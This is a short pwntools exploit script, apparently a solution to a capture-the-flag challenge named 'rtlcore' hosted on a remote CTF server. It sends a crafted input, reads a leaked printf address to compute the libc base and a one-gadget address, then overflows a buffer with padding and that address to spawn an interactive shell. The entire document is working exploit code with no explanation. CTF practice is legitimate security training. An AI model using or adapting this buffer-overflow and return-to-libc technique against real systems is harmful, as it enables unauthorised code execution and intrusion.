from pwn import *

r=remote("ctf.j0n9hyun.xyz",3015)
#r=process("./rtlcore")
lib=ELF("./libc.so.6")
context.log_level='debug'

oneshot=0x3a819

pay=p32(647098401)*4
pay+=p32(647098403)

r.recv()
r.sendline(pay)

r.recvuntil("0x")
printf=int(r.recv(8),16)
libcbase=printf-lib.symbols['printf']
log.info(hex(printf))
oneshot+=libcbase

pay2="x"*0x42
pay2+=p32(oneshot)

r.sendline(pay2)

r.interactive()



